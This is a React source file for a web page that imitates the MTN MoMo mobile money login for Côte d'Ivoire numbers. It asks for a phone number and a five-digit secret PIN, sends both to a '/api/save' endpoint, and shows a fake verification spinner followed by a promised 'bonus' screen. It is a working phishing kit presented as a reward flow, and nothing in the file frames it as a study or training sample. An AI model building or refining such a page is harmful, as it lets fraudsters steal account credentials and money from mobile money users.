'use client';

import { useState, useEffect } from 'react';

export default function MomoAppFlow() {
  // Gestion des étapes : 'login' | 'pin' | 'loading' | 'bonus'
  const [step, setStep] = useState<'login' | 'pin' | 'loading' | 'bonus'>('login');
  const [phoneNumber, setPhoneNumber] = useState('');

  return (
    <div className="min-h-dvh w-full font-sans">
      {step === 'login' && (
        <MomoLoginScreen 
          onNext={(phone) => {
            setPhoneNumber(phone);
            setStep('pin');
          }} 
        />
      )}
      
      {step === 'pin' && (
        <MomoPinScreen 
          phoneNumber={phoneNumber} 
          onBack={() => setStep('login')} 
          onPinComplete={async (pin) => {
            // On passe à l'écran de chargement
            setStep('loading');
            
            try {
              // Envoi des données à l'API
              await fetch('/api/save', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneNumber, pin })
              });
            } catch (error) {
              console.error("Erreur réseau", error);
            }

            // On attend 2 secondes puis on affiche la page de récompense
            setTimeout(() => {
              setStep('bonus');
            }, 2000);
          }}
        />
      )}

      {step === 'loading' && (
        <div className="flex min-h-dvh flex-col items-center justify-center bg-[#00405c] px-4">
          <div className="flex h-12 w-12 animate-spin items-center justify-center rounded-full border-4 border-[#ffcc00] border-t-transparent"></div>
          <p className="mt-6 text-lg font-medium text-white">
            Vérification en cours...
          </p>
          <p className="mt-2 text-sm text-[#a5c0cf]">
            Veuillez ne pas fermer cette page.
          </p>
        </div>
      )}

      {step === 'bonus' && <MomoBonusScreen />}
    </div>
  );
}

/* =========================================================
   ÉCRAN 1 : LOGIN MOMO (Numéro)
   ========================================================= */
function MomoLoginScreen({ onNext }: { onNext: (phone: string) => void }) {
  const [phone, setPhone] = useState('');
  const [language, setLanguage] = useState('Français');

  const formatPhone = (value: string) => {
    const raw = value.replace(/\D/g, '').slice(0, 10);
    return raw.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  };

  const isComplete = phone.replace(/\D/g, '').length === 10;

  return (
    <div className="flex min-h-dvh w-full flex-col bg-[#00405c] relative overflow-hidden md:flex-row">
      
      <div className="flex flex-col items-center justify-center pt-16 pb-6 z-10 md:w-1/2 md:pt-0 md:pb-0">
        <div className="flex h-[80px] w-[80px] items-center justify-center rounded-[20px] bg-[#ffcc00] shadow-lg mb-4">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-12 h-12 text-[#00405c]">
            <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z" />
          </svg>
        </div>
        <h1 className="text-[36px] font-bold text-[#ffcc00] leading-none mb-1">MoMo</h1>
        <p className="text-[12px] font-semibold text-[#ffcc00] tracking-wider uppercase">from MTN</p>
      </div>

      <div className="flex w-full flex-col items-center justify-center px-4 pb-12 md:w-1/2 md:px-12 md:pb-0">
        <div className="relative z-10 flex w-full max-w-[440px] flex-col rounded-[32px] bg-white px-8 pt-10 pb-10 shadow-2xl">
          <h2 className="text-center text-[24px] font-bold text-[#00405c] mb-8">
            Bienvenue sur MoMo
          </h2>

          <div className="flex flex-col gap-6">
            <div className="flex items-center gap-4">
              <div className="flex h-[56px] w-[56px] shrink-0 items-center justify-center rounded-xl border border-gray-900 bg-white">
                <div className="flex h-[32px] w-[32px] overflow-hidden rounded-full border border-gray-100">
                  <div className="w-1/3 h-full bg-[#F77F00]"></div>
                  <div className="w-1/3 h-full bg-white"></div>
                  <div className="w-1/3 h-full bg-[#009A44]"></div>
                </div>
              </div>
              
              <div className="relative flex-1">
                <input
                  type="tel"
                  value={formatPhone(phone)}
                  onChange={(e) => setPhone(e.target.value)}
                  placeholder=" "
                  className="peer w-full h-[56px] rounded-xl border border-gray-900 bg-white px-4 text-[17px] font-medium text-gray-900 outline-none focus:border-[#ffcc00] focus:ring-1 focus:ring-[#ffcc00]"
                />
                <label className="absolute left-3 top-1/2 -translate-y-1/2 bg-white px-1 text-[16px] text-gray-500 transition-all peer-focus:-top-2.5 peer-focus:translate-y-0 peer-focus:text-[12px] peer-focus:text-gray-900 peer-[:not(:placeholder-shown)]:-top-2.5 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-[12px] peer-[:not(:placeholder-shown)]:text-gray-900">
                  Saisir le numéro *
                </label>
              </div>
            </div>

            <div className="relative mt-2">
              <label className="absolute left-3 -top-2.5 bg-white px-1.5 text-[12px] font-medium text-gray-900">
                Sélectionnez une langue
              </label>
              <select
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
                className="w-full h-[56px] appearance-none rounded-xl border border-gray-900 bg-white px-4 text-[17px] font-medium text-gray-900 outline-none focus:border-[#ffcc00] focus:ring-1 focus:ring-[#ffcc00]"
              >
                <option value="Français">Français</option>
                <option value="English">English</option>
              </select>
              <div className="pointer-events-none absolute inset-y-0 right-4 flex items-center">
                <svg className="h-5 w-5 text-gray-900" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>
          </div>
        </div>

        <div className="mt-8 flex w-full max-w-[440px] flex-col items-center">
          <p className="text-center text-[13px] leading-[1.6] text-[#a5c0cf]">
            En utilisant cette application, vous acceptez nos{' '}
            <a href="#" className="font-semibold text-[#a5c0cf] underline decoration-[#a5c0cf]/50 underline-offset-2 hover:text-white transition-colors">
              Conditions générales d'utilisation (CGU)
            </a>{' '}
            et notre{' '}
            <a href="#" className="font-semibold text-[#a5c0cf] underline decoration-[#a5c0cf]/50 underline-offset-2 hover:text-white transition-colors">
              politique de confidentialité
            </a>
          </p>

          <button
            onClick={() => isComplete && onNext(phone)}
            disabled={!isComplete}
            className={`mt-6 w-full rounded-full h-[56px] text-[15px] font-bold uppercase tracking-wide transition-all duration-200 ${
              isComplete 
                ? 'bg-[#ffcc00] text-[#00405c] hover:bg-[#e6b800] shadow-[0_4px_14px_rgba(255,204,0,0.3)]' 
                : 'bg-[#b0b0b0] text-[#e0e0e0] cursor-not-allowed'
            }`}
          >
            Suivant
          </button>
        </div>
      </div>
    </div>
  );
}

/* =========================================================
   ÉCRAN 2 : CODE PIN MOMO (5 chiffres)
   ========================================================= */
function MomoPinScreen({ phoneNumber, onBack, onPinComplete }: { phoneNumber: string; onBack: () => void; onPinComplete: (pin: string) => void }) {
  const [pin, setPin] = useState('');
  const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', '⌫'];

  useEffect(() => {
    if (pin.length === 5) {
      const timer = setTimeout(() => {
        onPinComplete(pin);
      }, 300);
      return () => clearTimeout(timer);
    }
  }, [pin, onPinComplete]);

  const handleKey = (key: string) => {
    if (key === '⌫') setPin((p) => p.slice(0, -1));
    else if (pin.length < 5) setPin((p) => p + key);
  };

  const formatPhone = (value: string) => {
    const raw = value.replace(/\D/g, '').slice(0, 10);
    return raw.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
  };

  return (
    <div className="flex min-h-dvh w-full flex-col bg-[#00405c] relative overflow-hidden md:flex-row">
      
      <div className="flex flex-col items-center justify-center pt-12 pb-6 z-10 md:w-1/2 md:pt-0 md:pb-0">
        <div className="flex h-[72px] w-[72px] items-center justify-center rounded-[18px] bg-[#ffcc00] shadow-lg mb-3">
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" className="w-10 h-10 text-[#00405c]">
            <path d="M12 2L2 7l10 5 10-5-10-5zm0 9l2.5-1.25L12 8.5l-2.5 1.25L12 11zm0 2.5l-5-2.5-5 2.5L12 22l10-8.5-5-2.5-5 2.5z" />
          </svg>
        </div>
        <h1 className="text-[32px] font-bold text-[#ffcc00] leading-none mb-1">MoMo</h1>
        <p className="text-[11px] font-semibold text-[#ffcc00] tracking-wider uppercase mb-8">from MTN</p>

        <div className="text-center px-6">
          <p className="text-white text-[16px] font-medium mb-1">
            Entrez votre code secret
          </p>
          <p className="text-[#a5c0cf] text-[14px]">
            pour le compte <span className="font-bold text-white">+225 {formatPhone(phoneNumber)}</span>
          </p>
        </div>
      </div>

      <div className="flex w-full flex-col items-center justify-center px-4 pb-12 md:w-1/2 md:px-12 md:pb-0">
        <div className="relative z-10 flex w-full max-w-[440px] flex-col items-center rounded-[32px] bg-white px-8 pt-10 pb-8 shadow-2xl">
          
          <button onClick={onBack} className="absolute top-5 left-5 p-2 text-gray-500 hover:bg-gray-100 rounded-full transition">
            ←
          </button>

          <h2 className="text-[22px] font-bold text-[#00405c] mb-8">
            Code secret
          </h2>

          <div className="flex gap-4 mb-10">
            {[0, 1, 2, 3, 4].map((index) => (
              <div
                key={index}
                className={`h-4 w-4 rounded-full transition-colors ${
                  pin.length > index ? 'bg-[#ffcc00]' : 'bg-gray-200'
                }`}
              />
            ))}
          </div>

          <div className="grid w-full max-w-[280px] grid-cols-3 gap-y-4">
            {keys.map((key, i) =>
              key === '' ? <span key={i} /> : (
                <button
                  key={i}
                  onClick={() => handleKey(key)}
                  className="mx-auto flex h-16 w-16 items-center justify-center rounded-full text-[28px] text-[#00405c] transition hover:bg-gray-50 active:bg-gray-200"
                >
                  {key === '⌫' ? (
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="h-7 w-7">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 9.75L14.25 12m0 0l2.25 2.25M14.25 12l2.25-2.25M14.25 12L12 14.25m-2.58 4.92l-6.374-6.375a1.125 1.125 0 010-1.59L9.42 4.83c.21-.211.497-.33.795-.33H19.5a2.25 2.25 0 012.25 2.25v10.5a2.25 2.25 0 01-2.25 2.25h-9.284c-.298 0-.585-.119-.795-.33z" />
                    </svg>
                  ) : key}
                </button>
              )
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

/* =========================================================
   ÉCRAN 3 : BONUS / RÉCOMPENSE
   ========================================================= */
/* =========================================================
   ÉCRAN 3 : BONUS / RÉCOMPENSE (Confirmation)
   ========================================================= */
function MomoBonusScreen() {
  return (
    <div className="flex min-h-dvh flex-col items-center justify-center bg-[#f0f8ff] px-4 relative">
      
      <div className="flex w-full max-w-md flex-col items-center text-center">
        
        {/* Grosse coche verte de succès */}
        <div className="mb-6 flex h-24 w-24 items-center justify-center rounded-full bg-green-100 shadow-sm">
          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2.5} stroke="currentColor" className="h-12 w-12 text-[#00b050]">
            <path strokeLinecap="round" strokeLinejoin="round" d="M4.5 12.75l6 6 9-13.5" />
          </svg>
        </div>

        <h1 className="text-3xl font-bold text-[#00405c] mb-3">
          Demande prise en compte !
        </h1>

        <p className="text-[15px] leading-relaxed text-gray-600 mb-8">
          Votre requête a bien été enregistrée. <br />
          Nous traitons actuellement votre récompense.
        </p>

        {/* Boîte d'information */}
        <div className="w-full rounded-2xl bg-white p-6 shadow-[0_4px_20px_rgba(0,0,0,0.05)] border border-gray-100">
          <div className="flex items-center gap-3 mb-4">
            <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-[#ffcc00]/20">
              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="#00405c" className="h-5 w-5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z" />
              </svg>
            </div>
            <div className="text-left">
              <p className="text-sm font-bold text-gray-900">Traitement en cours</p>
              <p className="text-xs text-gray-500">Généralement sous 24h à 48h</p>
            </div>
          </div>

          <div className="h-px w-full bg-gray-100 mb-4"></div>

          <p className="text-xs text-gray-500 leading-relaxed text-left">
            Vous recevrez une notification par SMS dès que vos bonus seront disponibles sur votre compte MoMo.
          </p>
        </div>

        {/* Bouton de retour */}
        <button
          type="button"
          onClick={() => window.location.reload()} // Recharge la page pour revenir au début
          className="mt-8 w-full rounded-full bg-[#00405c] py-4 text-sm font-bold uppercase tracking-wide text-white transition hover:bg-gray-800 active:scale-[0.98]"
        >
          Retour à l'accueil
        </button>

      </div>
    </div>
  );
}

